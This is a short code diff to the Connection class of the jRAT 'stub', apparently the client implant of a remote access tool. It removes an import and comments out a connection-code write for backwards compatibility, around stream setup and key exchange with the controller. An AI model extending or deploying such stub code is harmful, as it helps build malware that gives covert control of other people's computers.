@@ -1,6 +1,5 @@
 package io.jrat.stub;
 
-import io.jrat.common.ConnectionCodes;
 import io.jrat.common.OperatingSystem;
 import io.jrat.common.Version;
 import io.jrat.common.codec.Hex;
@@ -83,7 +82,7 @@ public class Connection implements Runnable {
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
 	        
-			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
+			// outputStream.write(ConnectionCodes.DESKTOP_SLAVE); TODO Removed to make jRAT backwards compatible
 			
 			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
 			exchanger.readRemotePublicKey();
